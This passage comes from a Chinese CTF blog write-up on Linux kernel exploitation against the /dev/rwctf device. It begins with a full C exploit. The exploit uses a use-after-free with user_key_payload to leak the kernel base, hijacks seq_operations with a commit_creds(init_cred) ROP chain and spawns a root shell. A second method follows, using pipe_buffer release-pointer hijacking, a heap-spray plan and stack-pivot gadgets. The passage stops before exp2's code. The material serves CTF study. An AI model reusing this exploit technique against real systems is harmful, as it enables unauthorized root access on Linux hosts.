class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/keyctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;asm/ldt.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/shm.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> USER_FREE_PAYLOAD_RCU 0xFFFFFFFF813D8210</span></span><br><span class="line"><span class="type">size_t</span> pop_rdi = <span class="number">0xffffffff8106ab4d</span>; </span><br><span class="line"><span class="type">size_t</span> init_cred = <span class="number">0xffffffff82850580</span>;</span><br><span class="line"><span class="type">size_t</span> commit_creds = <span class="number">0xffffffff81095c30</span>;</span><br><span class="line"><span class="type">size_t</span> add_rsp_xx = <span class="number">0xFFFFFFFF812A9811</span>;<span class="comment">// FFFFFFFF813A193A;</span></span><br><span class="line"><span class="type">size_t</span> swapgs_kpti = <span class="number">0xFFFFFFFF81E00EF3</span>;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> idx;</span><br><span class="line">    <span class="type">int</span> size;</span><br><span class="line">    <span class="type">char</span>* ptr;</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">err_exit</span><span class="params">(<span class="type">char</span> *msg)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Error at: \033[0m%s\n&quot;</span>, msg);</span><br><span class="line">    sleep(<span class="number">5</span>);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">info</span><span class="params">(<span class="type">char</span> *msg)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] %s\n\033[0m&quot;</span>, msg);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">hexx</span><span class="params">(<span class="type">char</span> *msg, <span class="type">size_t</span> value)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] %s: %#lx\n\033[0m&quot;</span>, msg, value);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">binary_dump</span><span class="params">(<span class="type">char</span> *desc, <span class="type">void</span> *addr, <span class="type">int</span> len)</span> &#123;</span><br><span class="line">    <span class="type">uint64_t</span> *buf64 = (<span class="type">uint64_t</span> *) addr;</span><br><span class="line">    <span class="type">uint8_t</span> *buf8 = (<span class="type">uint8_t</span> *) addr;</span><br><span class="line">    <span class="keyword">if</span> (desc != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[33m[*] %s:\n\033[0m&quot;</span>, desc);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len / <span class="number">8</span>; i += <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;  %04x&quot;</span>, i * <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++) &#123;</span><br><span class="line">            i + j &lt; len / <span class="number">8</span> ? <span class="built_in">printf</span>(<span class="string">&quot; 0x%016lx&quot;</span>, buf64[i + j]) : <span class="built_in">printf</span>(<span class="string">&quot;                   &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;   &quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">32</span> &amp;&amp; j + i * <span class="number">8</span> &lt; len; j++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, <span class="built_in">isprint</span>(buf8[i * <span class="number">8</span> + j]) ? buf8[i * <span class="number">8</span> + j] : <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/* bind the process to specific core */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">bind_core</span><span class="params">(<span class="type">int</span> core)</span>&#123;</span><br><span class="line">    <span class="type">cpu_set_t</span> cpu_set;</span><br><span class="line"></span><br><span class="line">    CPU_ZERO(&amp;cpu_set);</span><br><span class="line">    CPU_SET(core, &amp;cpu_set);</span><br><span class="line">    sched_setaffinity(getpid(), <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Process binded to core \033[0m%d\n&quot;</span>, core);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> rw_fd;</span><br><span class="line"><span class="type">int</span> seq_fd;</span><br><span class="line"><span class="type">void</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> idx, <span class="type">int</span> size, <span class="type">char</span>* ptr)</span>&#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">node</span> <span class="title">n</span> =</span> &#123; .idx = idx, .size = size, .ptr = ptr &#125;;</span><br><span class="line">        ioctl(rw_fd, <span class="number">0xDEADBEEF</span>, &amp;n);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">dele</span><span class="params">(<span class="type">int</span> idx)</span>&#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">node</span> <span class="title">n</span> =</span> &#123; .idx = idx &#125;;</span><br><span class="line">        ioctl(rw_fd, <span class="number">0xC0DECAFE</span>, &amp;n);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">key_alloc</span><span class="params">(<span class="type">char</span> *description, <span class="type">char</span> *payload, <span class="type">size_t</span> plen)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_add_key, <span class="string">&quot;user&quot;</span>, description, payload, plen,</span><br><span class="line">                   KEY_SPEC_PROCESS_KEYRING);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">key_read</span><span class="params">(<span class="type">int</span> keyid, <span class="type">char</span> *buffer, <span class="type">size_t</span> buflen)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_keyctl, KEYCTL_READ, keyid, buffer, buflen);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">key_revoke</span><span class="params">(<span class="type">int</span> keyid)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_keyctl, KEYCTL_REVOKE, keyid, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv, <span class="type">char</span>** env)</span>&#123;</span><br><span class="line">    bind_core(<span class="number">0</span>);</span><br><span class="line">    <span class="type">int</span> res;</span><br><span class="line">    <span class="type">size_t</span> kernel_offset;</span><br><span class="line">    <span class="type">size_t</span> buf[<span class="number">0x100</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"> </span><br><span class="line">    rw_fd = open(<span class="string">&quot;/dev/rwctf&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (rw_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;Failed to open /dev/rwctf&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0</span>, <span class="number">0x40</span>, buf); <span class="comment">// obj0</span></span><br><span class="line">    add(<span class="number">1</span>, <span class="number">0x40</span>, buf); <span class="comment">// obj1</span></span><br><span class="line">    <span class="comment">// freelist 0x40 : obj2</span></span><br><span class="line">    dele(<span class="number">1</span>);</span><br><span class="line">    dele(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// freelist 0x40 : obj0 -&gt; obj1 -&gt; obj2</span></span><br><span class="line">    <span class="type">int</span> k0 = key_alloc(<span class="string">&quot;pwner0&quot;</span>, buf, <span class="number">0x40</span><span class="number">-0x18</span>); <span class="comment">// user_key_payload0 : obj1</span></span><br><span class="line">    <span class="type">int</span> k1 = key_alloc(<span class="string">&quot;pwner1&quot;</span>, buf, <span class="number">0x40</span><span class="number">-0x18</span>); <span class="comment">// user_key_payload1 : obj2</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// freelist 0x40 : obj0</span></span><br><span class="line">    key_revoke(k1);</span><br><span class="line">    <span class="comment">// freelist 0x40 : obj2 -&gt; obj0</span></span><br><span class="line">    dele(<span class="number">1</span>);</span><br><span class="line">    <span class="comment">// freelist 0x40 : obj1 -&gt; obj2 -&gt; obj0</span></span><br><span class="line">    buf[<span class="number">0</span>] = buf[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    buf[<span class="number">2</span>] = <span class="number">0x100</span>*<span class="number">8</span>;  <span class="comment">// user_key_payload-&gt;datalen = 0x800</span></span><br><span class="line">    add(<span class="number">1</span>, <span class="number">0x40</span> , buf);</span><br><span class="line">    <span class="comment">// freelist 0x40 : obj2 -&gt; obj0</span></span><br><span class="line">    res = key_read(k0, buf, <span class="number">0x100</span>*<span class="number">8</span>);</span><br><span class="line">    kernel_offset = buf[<span class="number">6</span>] - USER_FREE_PAYLOAD_RCU;</span><br><span class="line">    binary_dump(<span class="string">&quot;user_key_payload data&quot;</span>, buf, <span class="number">0x100</span>);</span><br><span class="line">    hexx(<span class="string">&quot;kernel_offset&quot;</span>, kernel_offset);</span><br><span class="line"> </span><br><span class="line">    pop_rdi += kernel_offset;</span><br><span class="line">    init_cred += kernel_offset;</span><br><span class="line">    commit_creds += kernel_offset;</span><br><span class="line">    swapgs_kpti += kernel_offset;</span><br><span class="line">    add_rsp_xx += kernel_offset;</span><br><span class="line">    hexx(<span class="string">&quot;add_rsp_xx&quot;</span>, add_rsp_xx);</span><br><span class="line">    hexx(<span class="string">&quot;pop_rdi&quot;</span>, pop_rdi);</span><br><span class="line">    hexx(<span class="string">&quot;init_cred&quot;</span>, init_cred);</span><br><span class="line">    hexx(<span class="string">&quot;commit_creds&quot;</span>, commit_creds);</span><br><span class="line">    hexx(<span class="string">&quot;swapgs_kpti&quot;</span>, swapgs_kpti);</span><br><span class="line"> </span><br><span class="line">    add(<span class="number">0</span>, <span class="number">0x20</span>, buf);</span><br><span class="line">    dele(<span class="number">0</span>);</span><br><span class="line"> </span><br><span class="line">    seq_fd = open(<span class="string">&quot;/proc/self/stat&quot;</span>, O_RDONLY);</span><br><span class="line">    dele(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0</span>, <span class="number">0x20</span>, &amp;add_rsp_xx);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">asm</span>(</span><br><span class="line">        <span class="string">&quot;mov r15, pop_rdi;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r14, init_cred;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r13, commit_creds;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r12, swapgs_kpti;&quot;</span></span><br><span class="line">    );</span><br><span class="line">    </span><br><span class="line">    read(seq_fd, buf, <span class="number">8</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="思路二"><a href="#思路二" class="headerlink" title="思路二"></a>思路二</h3><p>上面的思路一利用了<code>pt_regs</code>结构体，但是在内核开启了<code>CONFIG_RANDOMIZE_KSTACK_OFFSET=y</code>保护后该手法的利用难度会大大加大，所以这里利用了另外一种思路，即利用内核密钥管理来泄露内核地址和<code>pipe</code>管道来劫持控制程序流。首先给出部分<code>pipe</code>管道结构体源码</p><h4 id="pipe-inode-info"><a href="#pipe-inode-info" class="headerlink" title="pipe_inode_info"></a>pipe_inode_info</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">mutex</span>;</span></span><br><span class="line"><span class="type">wait_queue_head_t</span> rd_wait, wr_wait;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> head;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> tail;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> max_usage;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> ring_size;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_WATCH_QUEUE</span></span><br><span class="line"><span class="type">bool</span> note_loss;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> nr_accounted;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> readers;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> writers;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> files;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> r_counter;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> w_counter;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">tmp_page</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fasync_struct</span> *<span class="title">fasync_readers</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fasync_struct</span> *<span class="title">fasync_writers</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">bufs</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_WATCH_QUEUE</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">watch_queue</span> *<span class="title">watch_queue</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h4 id="pipe-buffer"><a href="#pipe-buffer" class="headerlink" title="pipe_buffer"></a>pipe_buffer</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> offset, len;</span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> flags;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> private;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>当我们创建一个管道时，内核会创建一个<code>VFS inode</code>与一个<code>pipe_inode_info</code>结构体，其中<code>pipe_inode_info-&gt;bufs</code>指向<code>pipe_buffer</code>结构体数组，因此我们可以利用他来泄露出内核的堆上地址<br>当我们创建一个管道时，在内核中会分配一个<code>pipe_buffer</code>结构体数组，申请的内存总大小刚好会让内核从<code>kmalloc-1k</code>中取出一个<code>object</code>。<code>pipe_buffer</code>的<code>page</code>指针指向一个<code>page</code>结构体，而这个<code>page</code>结构体对应着一个内存页，这个内存页是<code>pipe_buffer</code>用来存取数据的<code>buffer</code>。该内存页是在第一次向<code>pipe_buffer</code>中写入数据的时候分配<br>总的来说，<code>pipe_inode_info</code>维护了一个<code>pipe_buffer</code>组成的双端队列，下面借用<code>sky123</code>师傅的图片</p><img src="/2024/01/24/linux%20kernel%EF%BC%88%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%EF%BC%89/1.png" class="" title="我的图图呢">  <p>每一个<code>pipe_buffer</code>中的<code>offset</code>和<code>len</code>标记了<code>pipe_buffer</code>对应内存页中的数据，还是借用<code>sky123</code>师傅的图片</p><img src="/2024/01/24/linux%20kernel%EF%BC%88%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%EF%BC%89/2.png" class="" title="我的图图呢">  <p>当我们关闭了管道的两端时，会触发<code>pipe_buffer-&gt;pipe_buffer_operations-&gt;release</code>这一函数指针</p><h4 id="pipe-buf-operations"><a href="#pipe-buf-operations" class="headerlink" title="pipe_buf_operations"></a>pipe_buf_operations</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> &#123;</span></span><br><span class="line"><span class="type">int</span> (*confirm)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> pipe_buffer *);</span><br><span class="line"><span class="type">void</span> (*release)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> pipe_buffer *);</span><br><span class="line"><span class="type">bool</span> (*try_steal)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> pipe_buffer *);</span><br><span class="line"><span class="type">bool</span> (*get)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> pipe_buffer *);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>所以我们可以劫持该<code>release</code>指针。当程序运行到调用<code>release</code>指针时，<code>rsi</code>指针指向调用该<code>rlease</code>的<code>pipe_buffer</code>结构体，所以我们可以直接在<code>pipe_buffer</code>中写好<code>rop</code>链，利用<code>rsi</code>来栈迁移执行我们的<code>rop</code>链<br>现在回到题目中，由于前面我们提到过 <code>add_key()</code> 会先分配一个临时的 <code>obj1</code> 拷贝 <code>payload</code> 后再分配一个 <code>obj2</code> 作为 <code>user_key_payload</code>，若我们先分配一个 <code>obj</code> 并释放后再调用 <code>add_key()</code> 则该 <code>obj</code> 不会直接成为 <code>user_key_payload</code> ，而是会在后续的数次分配中都作为拷贝 <code>payload</code> 的临时 <code>obj</code> 存在。我们可以利用堆喷来实现将当前索引的<code>obj</code>成为<code>user_key_payload</code>，流程为（来自<code>arttnba3</code>师傅博客）：</p><ul><li>利用题目功能构建 <code>UAF object</code></li><li>堆喷射 <code>user_key_payload</code> ，<code>UAF obj</code> 作为拷贝 <code>payload</code> 的临时 <code>obj</code> 存在</li><li><code>kmem_cache_cpu</code> 的 <code>slub page</code> 耗光，向 <code>node</code> 请求新的 <code>slub page</code> 分配 <code>user_key_payload</code> ，完成后 <code>UAF obj</code> 被释放并回到 <code>kmem_cache_node</code></li><li>继续堆喷 <code>user_key_payload</code> ，<code>kmem_cache_cpu</code> 的 <code>slub page</code> 耗光，向 <code>node</code> 请求新的 <code>slub page</code> 分配 <code>user_key_payload</code></li><li><code>UAF obj</code> 所在页面被取回，<code>UAF obj</code> 被分配为 <code>user_key_payload</code></li><li>利用题目功能再次释放 <code>UAF obj</code>，利用题目功能进行堆喷获取到该 <code>obj</code>，从而覆写 <code>user_key_payload</code></li></ul><p>我们可以另<code>user_key_payload</code>与<code>pipe_inode_info</code>占用同一个<code>object</code>，这样 <code>pipe_inode_info</code> 刚好会将 <code>user_key_payload-&gt;datalen</code> 改为 <code>0xFFFF</code> 使得我们能够继续读取数据，从而读取 <code>pipe_inode_info</code> 以泄露出 <code>pipe_buffer</code> 的地址<br>最后我们直接在<code>pipe_inode_info</code>中布置好<code>fake pipe_buffer_operations</code>和<code>rop</code>链，最后通过关闭管道的两端来劫持程序流来执行我们的<code>rop</code>链进而提权，这里利用了下面<code>2</code>个<code>gadget</code>相互配合来实现栈迁移：</p><figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">0xffffffffa4250ca4:  pop    rbx</span><br><span class="line">0xffffffffa4250ca5:  xor    eax,eax</span><br><span class="line">0xffffffffa4250ca7:  pop    rbp</span><br><span class="line">0xffffffffa4250ca8:  pop    r12</span><br><span class="line">0xffffffffa4250caa:  ret</span><br><span class="line"></span><br><span class="line">0xffffffffa4250c9d:  push   rsi</span><br><span class="line">0xffffffffa4250c9e:  pop    rsp</span><br><span class="line">0xffffffffa4250c9f:  cmp    rcx,rdx</span><br><span class="line">0xffffffffa4250ca2:  jb     0xffffffffa4250c85</span><br><span class="line">0xffffffffa4250ca4:  pop    rbx</span><br><span class="line">0xffffffffa4250ca5:  xor    eax,eax</span><br><span class="line">0xffffffffa4250ca7:  pop    rbp</span><br><span class="line">0xffffffffa4250ca8:  pop    r12</span><br><span class="line">0xffffffffa4250caa:  ret</span><br></pre></td></tr></table></figure><p>脚本好像不太稳定，大概百分之<code>30</code>的概率能成功提权</p><h3 id="exp2"><a href="#exp2" class="headerlink" title="exp2"></a>exp2</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span 